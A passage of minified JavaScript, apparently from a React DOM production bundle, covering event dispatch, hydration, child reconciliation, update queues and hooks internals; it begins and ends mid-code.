e;case"keydown":case"keyup":E=HP;break;case"focusin":_="focus",E=kf;break;case"focusout":_="blur",E=kf;break;case"beforeblur":case"afterblur":E=kf;break;case"click":if(n.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":E=X0;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":E=AP;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":E=GP;break;case wC:case xC:case EC:E=jP;break;case CC:E=YP;break;case"scroll":E=PP;break;case"wheel":E=XP;break;case"copy":case"cut":case"paste":E=LP;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":E=Z0}var y=(e&4)!==0,C=!y&&t==="scroll",x=y?h!==null?h+"Capture":null:h;y=[];for(var w=u,S;w!==null;){S=w;var N=S.stateNode;if(S.tag===5&&N!==null&&(S=N,x!==null&&(N=_l(w,x),N!=null&&y.push(Tl(w,N,S)))),C)break;w=w.return}0<y.length&&(h=new E(h,_,null,n,p),f.push({event:h,listeners:y}))}}if(!(e&7)){e:{if(h=t==="mouseover"||t==="pointerover",E=t==="mouseout"||t==="pointerout",h&&n!==Up&&(_=n.relatedTarget||n.fromElement)&&(cs(_)||_[Nr]))break e;if((E||h)&&(h=p.window===p?p:(h=p.ownerDocument)?h.defaultView||h.parentWindow:window,E?(_=n.relatedTarget||n.toElement,E=u,_=_?cs(_):null,_!==null&&(C=Os(_),_!==C||_.tag!==5&&_.tag!==6)&&(_=null)):(E=null,_=u),E!==_)){if(y=X0,N="onMouseLeave",x="onMouseEnter",w="mouse",(t==="pointerout"||t==="pointerover")&&(y=Z0,N="onPointerLeave",x="onPointerEnter",w="pointer"),C=E==null?h:Js(E),S=_==null?h:Js(_),h=new y(N,w+"leave",E,n,p),h.target=C,h.relatedTarget=S,N=null,cs(p)===u&&(y=new y(x,w+"enter",_,n,p),y.target=S,y.relatedTarget=C,N=y),C=N,E&&_)t:{for(y=E,x=_,w=0,S=y;S;S=Bs(S))w++;for(S=0,N=x;N;N=Bs(N))S++;for(;0<w-S;)y=Bs(y),w--;for(;0<S-w;)x=Bs(x),S--;for(;w--;){if(y===x||x!==null&&y===x.alternate)break t;y=Bs(y),x=Bs(x)}y=null}else y=null;E!==null&&u_(f,h,E,y,!1),_!==null&&C!==null&&u_(f,C,_,y,!0)}}e:{if(h=u?Js(u):window,E=h.nodeName&&h.nodeName.toLowerCase(),E==="select"||E==="input"&&h.type==="file")var R=iR;else if(n_(h))if(mC)R=lR;else{R=oR;var j=sR}else(E=h.nodeName)&&E.toLowerCase()==="input"&&(h.type==="checkbox"||h.type==="radio")&&(R=aR);if(R&&(R=R(t,u))){pC(f,R,n,p);break e}j&&j(t,h,u),t==="focusout"&&(j=h._wrapperState)&&j.controlled&&h.type==="number"&&Dp(h,"number",h.value)}switch(j=u?Js(u):window,t){case"focusin":(n_(j)||j.contentEditable==="true")&&(Qs=j,Kp=u,nl=null);break;case"focusout":nl=Kp=Qs=null;break;case"mousedown":Gp=!0;break;case"contextmenu":case"mouseup":case"dragend":Gp=!1,a_(f,n,p);break;case"selectionchange":if(dR)break;case"keydown":case"keyup":a_(f,n,p)}var T;if(Mg)e:{switch(t){case"compositionstart":var b="onCompositionStart";break e;case"compositionend":b="onCompositionEnd";break e;case"compositionupdate":b="onCompositionUpdate";break e}b=void 0}else Ys?hC(t,n)&&(b="onCompositionEnd"):t==="keydown"&&n.keyCode===229&&(b="onCompositionStart");b&&(dC&&n.locale!=="ko"&&(Ys||b!=="onCompositionStart"?b==="onCompositionEnd"&&Ys&&(T=uC()):(hi=p,Og="value"in hi?hi.value:hi.textContent,Ys=!0)),j=nd(u,b),0<j.length&&(b=new J0(b,t,null,n,p),f.push({event:b,listeners:j}),T?b.data=T:(T=fC(n),T!==null&&(b.data=T)))),(T=ZP?eR(t,n):tR(t,n))&&(u=nd(u,"onBeforeInput"),0<u.length&&(p=new J0("onBeforeInput","beforeinput",null,n,p),f.push({event:p,listeners:u}),p.data=T))}bC(f,e)})}function Tl(t,e,n){return{instance:t,listener:e,currentTarget:n}}function nd(t,e){for(var n=e+"Capture",r=[];t!==null;){var i=t,s=i.stateNode;i.tag===5&&s!==null&&(i=s,s=_l(t,n),s!=null&&r.unshift(Tl(t,s,i)),s=_l(t,e),s!=null&&r.push(Tl(t,s,i))),t=t.return}return r}function Bs(t){if(t===null)return null;do t=t.return;while(t&&t.tag!==5);return t||null}function u_(t,e,n,r,i){for(var s=e._reactName,o=[];n!==null&&n!==r;){var a=n,c=a.alternate,u=a.stateNode;if(c!==null&&c===r)break;a.tag===5&&u!==null&&(a=u,i?(c=_l(n,s),c!=null&&o.unshift(Tl(n,c,a))):i||(c=_l(n,s),c!=null&&o.push(Tl(n,c,a)))),n=n.return}o.length!==0&&t.push({event:e,listeners:o})}var mR=/\r\n?/g,gR=/\u0000|\uFFFD/g;function d_(t){return(typeof t=="string"?t:""+t).replace(mR,`
`).replace(gR,"")}function Zc(t,e,n){if(e=d_(e),d_(t)!==e&&n)throw Error($(425))}function rd(){}var qp=null,Yp=null;function Qp(t,e){return t==="textarea"||t==="noscript"||typeof e.children=="string"||typeof e.children=="number"||typeof e.dangerouslySetInnerHTML=="object"&&e.dangerouslySetInnerHTML!==null&&e.dangerouslySetInnerHTML.__html!=null}var Xp=typeof setTimeout=="function"?setTimeout:void 0,vR=typeof clearTimeout=="function"?clearTimeout:void 0,h_=typeof Promise=="function"?Promise:void 0,yR=typeof queueMicrotask=="function"?queueMicrotask:typeof h_<"u"?function(t){return h_.resolve(null).then(t).catch(_R)}:Xp;function _R(t){setTimeout(function(){throw t})}function Lf(t,e){var n=e,r=0;do{var i=n.nextSibling;if(t.removeChild(n),i&&i.nodeType===8)if(n=i.data,n==="/$"){if(r===0){t.removeChild(i),El(e);return}r--}else n!=="$"&&n!=="$?"&&n!=="$!"||r++;n=i}while(n);El(e)}function _i(t){for(;t!=null;t=t.nextSibling){var e=t.nodeType;if(e===1||e===3)break;if(e===8){if(e=t.data,e==="$"||e==="$!"||e==="$?")break;if(e==="/$")return null}}return t}function f_(t){t=t.previousSibling;for(var e=0;t;){if(t.nodeType===8){var n=t.data;if(n==="$"||n==="$!"||n==="$?"){if(e===0)return t;e--}else n==="/$"&&e++}t=t.previousSibling}return null}var Qo=Math.random().toString(36).slice(2),Xn="__reactFiber$"+Qo,Il="__reactProps$"+Qo,Nr="__reactContainer$"+Qo,Jp="__reactEvents$"+Qo,wR="__reactListeners$"+Qo,xR="__reactHandles$"+Qo;function cs(t){var e=t[Xn];if(e)return e;for(var n=t.parentNode;n;){if(e=n[Nr]||n[Xn]){if(n=e.alternate,e.child!==null||n!==null&&n.child!==null)for(t=f_(t);t!==null;){if(n=t[Xn])return n;t=f_(t)}return e}t=n,n=t.parentNode}return null}function sc(t){return t=t[Xn]||t[Nr],!t||t.tag!==5&&t.tag!==6&&t.tag!==13&&t.tag!==3?null:t}function Js(t){if(t.tag===5||t.tag===6)return t.stateNode;throw Error($(33))}function ih(t){return t[Il]||null}var Zp=[],Zs=-1;function Ki(t){return{current:t}}function je(t){0>Zs||(t.current=Zp[Zs],Zp[Zs]=null,Zs--)}function Pe(t,e){Zs++,Zp[Zs]=t.current,t.current=e}var Di={},Ct=Ki(Di),Ht=Ki(!1),ws=Di;function Ao(t,e){var n=t.type.contextTypes;if(!n)return Di;var r=t.stateNode;if(r&&r.__reactInternalMemoizedUnmaskedChildContext===e)return r.__reactInternalMemoizedMaskedChildContext;var i={},s;for(s in n)i[s]=e[s];return r&&(t=t.stateNode,t.__reactInternalMemoizedUnmaskedChildContext=e,t.__reactInternalMemoizedMaskedChildContext=i),i}function Wt(t){return t=t.childContextTypes,t!=null}function id(){je(Ht),je(Ct)}function p_(t,e,n){if(Ct.current!==Di)throw Error($(168));Pe(Ct,e),Pe(Ht,n)}function IC(t,e,n){var r=t.stateNode;if(e=e.childContextTypes,typeof r.getChildContext!="function")return n;r=r.getChildContext();for(var i in r)if(!(i in e))throw Error($(108,sP(t)||"Unknown",i));return Ue({},n,r)}function sd(t){return t=(t=t.stateNode)&&t.__reactInternalMemoizedMergedChildContext||Di,ws=Ct.current,Pe(Ct,t),Pe(Ht,Ht.current),!0}function m_(t,e,n){var r=t.stateNode;if(!r)throw Error($(169));n?(t=IC(t,e,ws),r.__reactInternalMemoizedMergedChildContext=t,je(Ht),je(Ct),Pe(Ct,t)):je(Ht),Pe(Ht,n)}var vr=null,sh=!1,Ff=!1;function NC(t){vr===null?vr=[t]:vr.push(t)}function ER(t){sh=!0,NC(t)}function Gi(){if(!Ff&&vr!==null){Ff=!0;var t=0,e=xe;try{var n=vr;for(xe=1;t<n.length;t++){var r=n[t];do r=r(!0);while(r!==null)}vr=null,sh=!1}catch(i){throw vr!==null&&(vr=vr.slice(t+1)),ZE(kg,Gi),i}finally{xe=e,Ff=!1}}return null}var eo=[],to=0,od=null,ad=0,un=[],dn=0,xs=null,yr=1,_r="";function is(t,e){eo[to++]=ad,eo[to++]=od,od=t,ad=e}function kC(t,e,n){un[dn++]=yr,un[dn++]=_r,un[dn++]=xs,xs=t;var r=yr;t=_r;var i=32-On(r)-1;r&=~(1<<i),n+=1;var s=32-On(e)+i;if(30<s){var o=i-i%5;s=(r&(1<<o)-1).toString(32),r>>=o,i-=o,yr=1<<32-On(e)+i|n<<i|r,_r=s+t}else yr=1<<s|n<<i|r,_r=t}function Fg(t){t.return!==null&&(is(t,1),kC(t,1,0))}function Ug(t){for(;t===od;)od=eo[--to],eo[to]=null,ad=eo[--to],eo[to]=null;for(;t===xs;)xs=un[--dn],un[dn]=null,_r=un[--dn],un[dn]=null,yr=un[--dn],un[dn]=null}var tn=null,en=null,Me=!1,In=null;function PC(t,e){var n=hn(5,null,null,0);n.elementType="DELETED",n.stateNode=e,n.return=t,e=t.deletions,e===null?(t.deletions=[n],t.flags|=16):e.push(n)}function g_(t,e){switch(t.tag){case 5:var n=t.type;return e=e.nodeType!==1||n.toLowerCase()!==e.nodeName.toLowerCase()?null:e,e!==null?(t.stateNode=e,tn=t,en=_i(e.firstChild),!0):!1;case 6:return e=t.pendingProps===""||e.nodeType!==3?null:e,e!==null?(t.stateNode=e,tn=t,en=null,!0):!1;case 13:return e=e.nodeType!==8?null:e,e!==null?(n=xs!==null?{id:yr,overflow:_r}:null,t.memoizedState={dehydrated:e,treeContext:n,retryLane:1073741824},n=hn(18,null,null,0),n.stateNode=e,n.return=t,t.child=n,tn=t,en=null,!0):!1;default:return!1}}function em(t){return(t.mode&1)!==0&&(t.flags&128)===0}function tm(t){if(Me){var e=en;if(e){var n=e;if(!g_(t,e)){if(em(t))throw Error($(418));e=_i(n.nextSibling);var r=tn;e&&g_(t,e)?PC(r,n):(t.flags=t.flags&-4097|2,Me=!1,tn=t)}}else{if(em(t))throw Error($(418));t.flags=t.flags&-4097|2,Me=!1,tn=t}}}function v_(t){for(t=t.return;t!==null&&t.tag!==5&&t.tag!==3&&t.tag!==13;)t=t.return;tn=t}function eu(t){if(t!==tn)return!1;if(!Me)return v_(t),Me=!0,!1;var e;if((e=t.tag!==3)&&!(e=t.tag!==5)&&(e=t.type,e=e!=="head"&&e!=="body"&&!Qp(t.type,t.memoizedProps)),e&&(e=en)){if(em(t))throw RC(),Error($(418));for(;e;)PC(t,e),e=_i(e.nextSibling)}if(v_(t),t.tag===13){if(t=t.memoizedState,t=t!==null?t.dehydrated:null,!t)throw Error($(317));e:{for(t=t.nextSibling,e=0;t;){if(t.nodeType===8){var n=t.data;if(n==="/$"){if(e===0){en=_i(t.nextSibling);break e}e--}else n!=="$"&&n!=="$!"&&n!=="$?"||e++}t=t.nextSibling}en=null}}else en=tn?_i(t.stateNode.nextSibling):null;return!0}function RC(){for(var t=en;t;)t=_i(t.nextSibling)}function Oo(){en=tn=null,Me=!1}function $g(t){In===null?In=[t]:In.push(t)}var CR=Lr.ReactCurrentBatchConfig;function La(t,e,n){if(t=n.ref,t!==null&&typeof t!="function"&&typeof t!="object"){if(n._owner){if(n=n._owner,n){if(n.tag!==1)throw Error($(309));var r=n.stateNode}if(!r)throw Error($(147,t));var i=r,s=""+t;return e!==null&&e.ref!==null&&typeof e.ref=="function"&&e.ref._stringRef===s?e.ref:(e=function(o){var a=i.refs;o===null?delete a[s]:a[s]=o},e._stringRef=s,e)}if(typeof t!="string")throw Error($(284));if(!n._owner)throw Error($(290,t))}return t}function tu(t,e){throw t=Object.prototype.toString.call(e),Error($(31,t==="[object Object]"?"object with keys {"+Object.keys(e).join(", ")+"}":t))}function y_(t){var e=t._init;return e(t._payload)}function AC(t){function e(x,w){if(t){var S=x.deletions;S===null?(x.deletions=[w],x.flags|=16):S.push(w)}}function n(x,w){if(!t)return null;for(;w!==null;)e(x,w),w=w.sibling;return null}function r(x,w){for(x=new Map;w!==null;)w.key!==null?x.set(w.key,w):x.set(w.index,w),w=w.sibling;return x}function i(x,w){return x=Ci(x,w),x.index=0,x.sibling=null,x}function s(x,w,S){return x.index=S,t?(S=x.alternate,S!==null?(S=S.index,S<w?(x.flags|=2,w):S):(x.flags|=2,w)):(x.flags|=1048576,w)}function o(x){return t&&x.alternate===null&&(x.flags|=2),x}function a(x,w,S,N){return w===null||w.tag!==6?(w=Wf(S,x.mode,N),w.return=x,w):(w=i(w,S),w.return=x,w)}function c(x,w,S,N){var R=S.type;return R===qs?p(x,w,S.props.children,N,S.key):w!==null&&(w.elementType===R||typeof R=="object"&&R!==null&&R.$$typeof===Zr&&y_(R)===w.type)?(N=i(w,S.props),N.ref=La(x,w,S),N.return=x,N):(N=Ou(S.type,S.key,S.props,null,x.mode,N),N.ref=La(x,w,S),N.return=x,N)}function u(x,w,S,N){return w===null||w.tag!==4||w.stateNode.containerInfo!==S.containerInfo||w.stateNode.implementation!==S.implementation?(w=Kf(S,x.mode,N),w.return=x,w):(w=i(w,S.children||[]),w.return=x,w)}function p(x,w,S,N,R){return w===null||w.tag!==7?(w=ys(S,x.mode,N,R),w.return=x,w):(w=i(w,S),w.return=x,w)}function f(x,w,S){if(typeof w=="string"&&w!==""||typeof w=="number")return w=Wf(""+w,x.mode,S),w.return=x,w;if(typeof w=="object"&&w!==null){switch(w.$$typeof){case Hc:return S=Ou(w.type,w.key,w.props,null,x.mode,S),S.ref=La(x,null,w),S.return=x,S;case Gs:return w=Kf(w,x.mode,S),w.return=x,w;case Zr:var N=w._init;return f(x,N(w._payload),S)}if(Ga(w)||Aa(w))return w=ys(w,x.mode,S,null),w.return=x,w;tu(x,w)}return null}function h(x,w,S,N){var R=w!==null?w.key:null;if(typeof S=="string"&&S!==""||typeof S=="number")return R!==null?null:a(x,w,""+S,N);if(typeof S=="object"&&S!==null){switch(S.$$typeof){case Hc:return S.key===R?c(x,w,S,N):null;case Gs:return S.key===R?u(x,w,S,N):null;case Zr:return R=S._init,h(x,w,R(S._payload),N)}if(Ga(S)||Aa(S))return R!==null?null:p(x,w,S,N,null);tu(x,S)}return null}function E(x,w,S,N,R){if(typeof N=="string"&&N!==""||typeof N=="number")return x=x.get(S)||null,a(w,x,""+N,R);if(typeof N=="object"&&N!==null){switch(N.$$typeof){case Hc:return x=x.get(N.key===null?S:N.key)||null,c(w,x,N,R);case Gs:return x=x.get(N.key===null?S:N.key)||null,u(w,x,N,R);case Zr:var j=N._init;return E(x,w,S,j(N._payload),R)}if(Ga(N)||Aa(N))return x=x.get(S)||null,p(w,x,N,R,null);tu(w,N)}return null}function _(x,w,S,N){for(var R=null,j=null,T=w,b=w=0,P=null;T!==null&&b<S.length;b++){T.index>b?(P=T,T=null):P=T.sibling;var k=h(x,T,S[b],N);if(k===null){T===null&&(T=P);break}t&&T&&k.alternate===null&&e(x,T),w=s(k,w,b),j===null?R=k:j.sibling=k,j=k,T=P}if(b===S.length)return n(x,T),Me&&is(x,b),R;if(T===null){for(;b<S.length;b++)T=f(x,S[b],N),T!==null&&(w=s(T,w,b),j===null?R=T:j.sibling=T,j=T);return Me&&is(x,b),R}for(T=r(x,T);b<S.length;b++)P=E(T,x,b,S[b],N),P!==null&&(t&&P.alternate!==null&&T.delete(P.key===null?b:P.key),w=s(P,w,b),j===null?R=P:j.sibling=P,j=P);return t&&T.forEach(function(O){return e(x,O)}),Me&&is(x,b),R}function y(x,w,S,N){var R=Aa(S);if(typeof R!="function")throw Error($(150));if(S=R.call(S),S==null)throw Error($(151));for(var j=R=null,T=w,b=w=0,P=null,k=S.next();T!==null&&!k.done;b++,k=S.next()){T.index>b?(P=T,T=null):P=T.sibling;var O=h(x,T,k.value,N);if(O===null){T===null&&(T=P);break}t&&T&&O.alternate===null&&e(x,T),w=s(O,w,b),j===null?R=O:j.sibling=O,j=O,T=P}if(k.done)return n(x,T),Me&&is(x,b),R;if(T===null){for(;!k.done;b++,k=S.next())k=f(x,k.value,N),k!==null&&(w=s(k,w,b),j===null?R=k:j.sibling=k,j=k);return Me&&is(x,b),R}for(T=r(x,T);!k.done;b++,k=S.next())k=E(T,x,b,k.value,N),k!==null&&(t&&k.alternate!==null&&T.delete(k.key===null?b:k.key),w=s(k,w,b),j===null?R=k:j.sibling=k,j=k);return t&&T.forEach(function(D){return e(x,D)}),Me&&is(x,b),R}function C(x,w,S,N){if(typeof S=="object"&&S!==null&&S.type===qs&&S.key===null&&(S=S.props.children),typeof S=="object"&&S!==null){switch(S.$$typeof){case Hc:e:{for(var R=S.key,j=w;j!==null;){if(j.key===R){if(R=S.type,R===qs){if(j.tag===7){n(x,j.sibling),w=i(j,S.props.children),w.return=x,x=w;break e}}else if(j.elementType===R||typeof R=="object"&&R!==null&&R.$$typeof===Zr&&y_(R)===j.type){n(x,j.sibling),w=i(j,S.props),w.ref=La(x,j,S),w.return=x,x=w;break e}n(x,j);break}else e(x,j);j=j.sibling}S.type===qs?(w=ys(S.props.children,x.mode,N,S.key),w.return=x,x=w):(N=Ou(S.type,S.key,S.props,null,x.mode,N),N.ref=La(x,w,S),N.return=x,x=N)}return o(x);case Gs:e:{for(j=S.key;w!==null;){if(w.key===j)if(w.tag===4&&w.stateNode.containerInfo===S.containerInfo&&w.stateNode.implementation===S.implementation){n(x,w.sibling),w=i(w,S.children||[]),w.return=x,x=w;break e}else{n(x,w);break}else e(x,w);w=w.sibling}w=Kf(S,x.mode,N),w.return=x,x=w}return o(x);case Zr:return j=S._init,C(x,w,j(S._payload),N)}if(Ga(S))return _(x,w,S,N);if(Aa(S))return y(x,w,S,N);tu(x,S)}return typeof S=="string"&&S!==""||typeof S=="number"?(S=""+S,w!==null&&w.tag===6?(n(x,w.sibling),w=i(w,S),w.return=x,x=w):(n(x,w),w=Wf(S,x.mode,N),w.return=x,x=w),o(x)):n(x,w)}return C}var Do=AC(!0),OC=AC(!1),ld=Ki(null),cd=null,no=null,zg=null;function Bg(){zg=no=cd=null}function Vg(t){var e=ld.current;je(ld),t._currentValue=e}function nm(t,e,n){for(;t!==null;){var r=t.alternate;if((t.childLanes&e)!==e?(t.childLanes|=e,r!==null&&(r.childLanes|=e)):r!==null&&(r.childLanes&e)!==e&&(r.childLanes|=e),t===n)break;t=t.return}}function ho(t,e){cd=t,zg=no=null,t=t.dependencies,t!==null&&t.firstContext!==null&&(t.lanes&e&&(Bt=!0),t.firstContext=null)}function gn(t){var e=t._currentValue;if(zg!==t)if(t={context:t,memoizedValue:e,next:null},no===null){if(cd===null)throw Error($(308));no=t,cd.dependencies={lanes:0,firstContext:t}}else no=no.next=t;return e}var us=null;function Hg(t){us===null?us=[t]:us.push(t)}function DC(t,e,n,r){var i=e.interleaved;return i===null?(n.next=n,Hg(e)):(n.next=i.next,i.next=n),e.interleaved=n,kr(t,r)}function kr(t,e){t.lanes|=e;var n=t.alternate;for(n!==null&&(n.lanes|=e),n=t,t=t.return;t!==null;)t.childLanes|=e,n=t.alternate,n!==null&&(n.childLanes|=e),n=t,t=t.return;return n.tag===3?n.stateNode:null}var ei=!1;function Wg(t){t.updateQueue={baseState:t.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,interleaved:null,lanes:0},effects:null}}function jC(t,e){t=t.updateQueue,e.updateQueue===t&&(e.updateQueue={baseState:t.baseState,firstBaseUpdate:t.firstBaseUpdate,lastBaseUpdate:t.lastBaseUpdate,shared:t.shared,effects:t.effects})}function Cr(t,e){return{eventTime:t,lane:e,tag:0,payload:null,callback:null,next:null}}function wi(t,e,n){var r=t.updateQueue;if(r===null)return null;if(r=r.shared,me&2){var i=r.pending;return i===null?e.next=e:(e.next=i.next,i.next=e),r.pending=e,kr(t,n)}return i=r.interleaved,i===null?(e.next=e,Hg(r)):(e.next=i.next,i.next=e),r.interleaved=e,kr(t,n)}function Iu(t,e,n){if(e=e.updateQueue,e!==null&&(e=e.shared,(n&4194240)!==0)){var r=e.lanes;r&=t.pendingLanes,n|=r,e.lanes=n,Pg(t,n)}}function __(t,e){var n=t.updateQueue,r=t.alternate;if(r!==null&&(r=r.updateQueue,n===r)){var i=null,s=null;if(n=n.firstBaseUpdate,n!==null){do{var o={eventTime:n.eventTime,lane:n.lane,tag:n.tag,payload:n.payload,callback:n.callback,next:null};s===null?i=s=o:s=s.next=o,n=n.next}while(n!==null);s===null?i=s=e:s=s.next=e}else i=s=e;n={baseState:r.baseState,firstBaseUpdate:i,lastBaseUpdate:s,shared:r.shared,effects:r.effects},t.updateQueue=n;return}t=n.lastBaseUpdate,t===null?n.firstBaseUpdate=e:t.next=e,n.lastBaseUpdate=e}function ud(t,e,n,r){var i=t.updateQueue;ei=!1;var s=i.firstBaseUpdate,o=i.lastBaseUpdate,a=i.shared.pending;if(a!==null){i.shared.pending=null;var c=a,u=c.next;c.next=null,o===null?s=u:o.next=u,o=c;var p=t.alternate;p!==null&&(p=p.updateQueue,a=p.lastBaseUpdate,a!==o&&(a===null?p.firstBaseUpdate=u:a.next=u,p.lastBaseUpdate=c))}if(s!==null){var f=i.baseState;o=0,p=u=c=null,a=s;do{var h=a.lane,E=a.eventTime;if((r&h)===h){p!==null&&(p=p.next={eventTime:E,lane:0,tag:a.tag,payload:a.payload,callback:a.callback,next:null});e:{var _=t,y=a;switch(h=e,E=n,y.tag){case 1:if(_=y.payload,typeof _=="function"){f=_.call(E,f,h);break e}f=_;break e;case 3:_.flags=_.flags&-65537|128;case 0:if(_=y.payload,h=typeof _=="function"?_.call(E,f,h):_,h==null)break e;f=Ue({},f,h);break e;case 2:ei=!0}}a.callback!==null&&a.lane!==0&&(t.flags|=64,h=i.effects,h===null?i.effects=[a]:h.push(a))}else E={eventTime:E,lane:h,tag:a.tag,payload:a.payload,callback:a.callback,next:null},p===null?(u=p=E,c=f):p=p.next=E,o|=h;if(a=a.next,a===null){if(a=i.shared.pending,a===null)break;h=a,a=h.next,h.next=null,i.lastBaseUpdate=h,i.shared.pending=null}}while(!0);if(p===null&&(c=f),i.baseState=c,i.firstBaseUpdate=u,i.lastBaseUpdate=p,e=i.shared.interleaved,e!==null){i=e;do o|=i.lane,i=i.next;while(i!==e)}else s===null&&(i.shared.lanes=0);Cs|=o,t.lanes=o,t.memoizedState=f}}function w_(t,e,n){if(t=e.effects,e.effects=null,t!==null)for(e=0;e<t.length;e++){var r=t[e],i=r.callback;if(i!==null){if(r.callback=null,r=n,typeof i!="function")throw Error($(191,i));i.call(r)}}}var oc={},er=Ki(oc),Nl=Ki(oc),kl=Ki(oc);function ds(t){if(t===oc)throw Error($(174));return t}function Kg(t,e){switch(Pe(kl,e),Pe(Nl,t),Pe(er,oc),t=e.nodeType,t){case 9:case 11:e=(e=e.documentElement)?e.namespaceURI:Mp(null,"");break;default:t=t===8?e.parentNode:e,e=t.namespaceURI||null,t=t.tagName,e=Mp(e,t)}je(er),Pe(er,e)}function jo(){je(er),je(Nl),je(kl)}function MC(t){ds(kl.current);var e=ds(er.current),n=Mp(e,t.type);e!==n&&(Pe(Nl,t),Pe(er,n))}function Gg(t){Nl.current===t&&(je(er),je(Nl))}var Le=Ki(0);function dd(t){for(var e=t;e!==null;){if(e.tag===13){var n=e.memoizedState;if(n!==null&&(n=n.dehydrated,n===null||n.data==="$?"||n.data==="$!"))return e}else if(e.tag===19&&e.memoizedProps.revealOrder!==void 0){if(e.flags&128)return e}else if(e.child!==null){e.child.return=e,e=e.child;continue}if(e===t)break;for(;e.sibling===null;){if(e.return===null||e.return===t)return null;e=e.return}e.sibling.return=e.return,e=e.sibling}return null}var Uf=[];function qg(){for(var t=0;t<Uf.length;t++)Uf[t]._workInProgressVersionPrimary=null;Uf.length=0}var Nu=Lr.ReactCurrentDispatcher,$f=Lr.ReactCurrentBatchConfig,Es=0,Fe=null,Ze=null,it=null,hd=!1,rl=!1,Pl=0,SR=0;function _t(){throw Error($(321))}function Yg(t,e){if(e===null)return!1;for(var n=0;n<e.length&&n<t.length;n++)if(!Mn(t[n],e[n]))return!1;return!0}function Qg(t,e,n,r,i,s){if(Es=s,Fe=e,e.memoizedState=null,e.updateQueue=null,e.lanes=0,Nu.current=t===null||t.memoizedState===null?NR:kR,t=n(r,i),rl){s=0;do{if(rl=!1,Pl=0,25<=s)throw Error($(301));s+=1,it=Ze=null,e.updateQueue=null,Nu.current=PR,t=n(r,i)}while(rl)}if(Nu.current=fd,e=Ze!==null&&Ze.next!==null,Es=0,it=Ze=Fe=null,hd=!1,e)throw Error($(300));return t}function Xg(){var t=Pl!==0;return Pl=0,t}function Gn(){var t={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return it===null?Fe.memoizedState=it=t:it=it.next=t,it}function vn(){if(Ze===null){var t=Fe.alternate;t=t!==null?t.memoizedState:null}else t=Ze.next;var e=it===null?Fe.memoizedState:it.next;if(e!==null)it=e,Ze=t;else{if(t===null)throw Error($(310));Ze=t,t={memoizedState:Ze.memoizedState,baseState:Ze.baseState,baseQueue:Ze.baseQueue,queue:Ze.queue,next:null},it===null?Fe.memoizedState=it=t:it=it.next=t}return it}function Rl(t,e){return typeof e=="function"?e(t):e}function zf(t){var e=vn(),n=e.queue;if(n===null)throw Error($(311));n.lastRenderedReducer=t;var r=Ze,i=r.baseQueue,s=n.pending;if(s!==null){if(i!==null){var o=i.next;i.next=s.next,s.next=o}r.baseQueue=i=s,n.pending=null}if(i!==null){s=i.next,r=r.baseState;var a=o=null,c=null,u=s;do{var p=u.lane;if((Es&p)===p)c!==null&&(c=c.next={lane:0,action:u.action,hasEagerState:u.hasEagerState,eagerState:u.eagerState,next:null}),r=u.hasEagerState?u.eagerState:t(r,u.action);else{var f={lane:p,action:u.action,hasEagerState:u.hasEagerState,eagerState:u.eagerState,next:null};c===null?(a=c=f,o=r):c=c.next=f,Fe.lanes|=p,Cs|=p}u=u.next}while(u!==null&&u!==s);c===null?o=r:c.next=a,Mn(r,e.memoizedState)||(Bt=!0),e.memoizedState=r,e.baseState=o,e.baseQueue=c,n.lastRenderedState=r}if(t=n.interleaved,t!==null){i=t;do s=i.lane,Fe.lanes|=s,Cs|=s,i=i.next;while(i!==t)}else i===null&&(n.lanes=0);return[e.memoizedState,n.dispatch]}function Bf(t){var e=vn(),n=e.queue;if(n===null)throw Error($(311));n.lastRenderedReducer=t;var r=n.dispatch,i=n.pending,s=e.memoizedState;if(i!==null){n.pending=null;var o=i=i.next;do s=t(s,o.action),o=o.next;while(o!==i);Mn(s,e.memoizedState)||(Bt=!0),e.memoizedState=s,e.baseQueue===null&&(e.baseState=s),n.lastRenderedState=s}return[s,r]}function LC(){}function FC(t,e){var n=Fe,r=vn(),i=e(),s=!Mn(r.memoizedState,i);if(s&&(r.memoizedState=i,Bt=!0),r=r.queue,Jg(zC.bind(null,n,r,t),[t]),r.getSnapshot!==e||s||it!==null&&it.memoizedState.tag&1){if(n.flags|=2048,Al(9,$C.bind(null,n,r,i,e),void 0,null),ot===null)throw Error($(349));Es&30||UC(n,e,i)}return i}function UC(t,e,n){t.flags|=16384,t={getSnapshot:e,value:n},e=Fe.updateQueue,e===null?(e={lastEffect:null,stores:null},Fe.updateQueue=e,e.stores=[t]):(n=e.stores,n===null?e.stores=[t]:n.push(t))}function $C(t,e,n,r){e.value=n,e.getSnapshot=r,BC(e)&&VC(t)}function zC(t,e,n){return n(function(){BC(e)&&VC(t)})}function BC(t){var e=t.getSnapshot;t=t.value;try{var n=e();return!Mn(t,n)}catch{return!0}}function VC(t){var e=kr(t,1);e!==null&&Dn(e,t,1,-1)}function x_(t){var e=Gn();return typeof t=="function"&&(t=t()),e.memoizedState=e.baseState=t,t={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:Rl,lastRenderedState:t},e.queue=t,t=t.dispatch=IR.bind(null,Fe,t),[e.memoizedState,t]}function Al(t,e,n,r){return t={tag:t,create:e,destroy:n,deps:r,next:null},e=Fe.updateQueue,e===null?(e={lastEffect:null,stores:null},Fe.updateQueue=e,e.lastEffect=t.next=t):(n=e.lastEffect,n===null?e.lastEffect=t.next=t:(r=n.next,n.next=t,t.next=r,e.lastEffect=t)),t}function HC(){return vn().memoizedState}function ku(t,e,n,r){var i=Gn();Fe.flags|=t,i.memoizedState=Al(1|e,n,void 0,r===void 0?null:r)}function oh(t,e,n,r){var i=vn();r=r===void 0?null:r;var s=void 0;if(Ze!==null){var o=Ze.memoizedState;if(s=o.destroy,r!==null&&Yg(r,o.deps)){i.memoizedState=Al(e,n,s,r);return}}Fe.flags|=t,i.memoizedState=Al(1|e,n,s,r)}function E_(t,e){return ku(8390656,8,t,e)}function Jg(t,e){return oh(2048,8,t,e)}function WC(t,e){return oh(4,2,t,e)}function KC(t,e){return oh(4,4,t,e)}function GC(t,e){if(typeof e=="function")return t=t(),e(t),function(){e(null)};if(e!=null)return 